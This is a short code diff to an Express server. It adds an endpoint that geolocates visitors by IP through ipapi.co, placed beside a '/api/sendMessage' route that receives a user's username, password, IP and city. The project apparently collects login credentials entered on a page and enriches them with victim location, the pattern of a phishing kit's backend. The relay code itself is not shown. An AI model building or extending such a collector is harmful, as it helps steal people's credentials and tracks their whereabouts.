@@ -28,7 +28,31 @@ app.get('/', (req, res) => {
     res.send('Servidor activo');
 });
 
+// ... resto del código ...
 
+app.get('/api/get-location', async (req, res) => {
+    try {
+        // La IP real del cliente viene en estos headers (Railway / proxies)
+        const clientIp = 
+            req.headers['cf-connecting-ip'] || 
+            req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+            req.socket.remoteAddress || 
+            'unknown';
+
+        const ipToUse = clientIp === '::1' || clientIp === '127.0.0.1' ? '8.8.8.8' : clientIp;
+
+        const geoResponse = await axios.get(`https://ipapi.co/${ipToUse}/json/`);
+        
+        res.json({
+            ip: ipToUse,
+            city: geoResponse.data.city || 'Desconocida',
+            // puedes agregar más campos si quieres
+        });
+    } catch (error) {
+        console.error('Error obteniendo ubicación:', error.message);
+        res.status(500).json({ ip: 'unknown', city: 'Desconocida' });
+    }
+});
 app.post('/api/sendMessage', async (req, res) => {
     const { user, password, ip, city } = req.body;
 
